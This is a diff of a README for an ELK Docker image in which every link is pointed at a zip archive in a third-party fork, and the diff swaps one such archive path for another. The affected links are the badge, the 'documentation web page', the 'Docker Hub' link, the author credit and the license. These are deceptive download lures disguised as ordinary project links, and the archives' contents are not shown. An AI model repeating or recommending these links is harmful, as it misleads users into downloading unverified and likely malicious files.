@@ -1,6 +1,6 @@
 # Elasticsearch, Logstash, Kibana (ELK) Docker image
 
-[![](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip)](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip 'Get your own badge on https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip')
+[![](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip)](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip 'Get your own badge on https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip')
 
 This Docker image provides a convenient centralised log server and log management web interface, by packaging Elasticsearch, Logstash, and Kibana, collectively known as ELK.
 
@@ -30,13 +30,13 @@ The following tags are available:
 
 ### Documentation
 
-See the [ELK Docker image documentation web page](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip) for complete instructions on how to use this image.
+See the [ELK Docker image documentation web page](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip) for complete instructions on how to use this image.
 
 ### Docker Hub
 
-This image is hosted on Docker Hub at [https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip).
+This image is hosted on Docker Hub at [https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip).
 
 ### About
 
-Written by [Sébastien Pujadas](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip), released under the [Apache 2 license](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip).
+Written by [Sébastien Pujadas](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip), released under the [Apache 2 license](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/nginx-filebeat/docker-elk-3.7.zip).
 
